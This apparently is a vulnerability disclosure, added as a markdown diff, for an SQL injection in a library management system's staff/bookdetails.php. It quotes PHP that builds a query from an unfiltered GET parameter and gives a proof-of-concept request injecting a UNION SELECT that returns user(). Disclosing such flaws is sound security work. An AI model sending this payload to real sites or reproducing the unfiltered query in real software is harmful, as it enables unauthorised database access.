@@ -1,0 +1,38 @@
+### Vulnerability file address
+
+`staff/bookdetails.php` from line 108
+
+The incoming $x variable is not filtered, there is sql injection
+
+```php
+......
+......
+......
+$x=$_GET['id'];
+$sql="select * from LMS.book where BookId='$x'";
+$result=$conn->query($sql);
+$row=$result->fetch_assoc();   
+......
+......
+......
+```
+
+### POC
+
+not exists any precondition
+
+```http
+GET /staff/bookdetails.php?id=1'+union+select+1,2,3,4,5,6,7,8,9,user()+%23 HTTP/1.1
+Host: www.lms.net
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+```
+
+### Attack results pictures
+
+![image-20220702210109710](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220703133000.png)
+
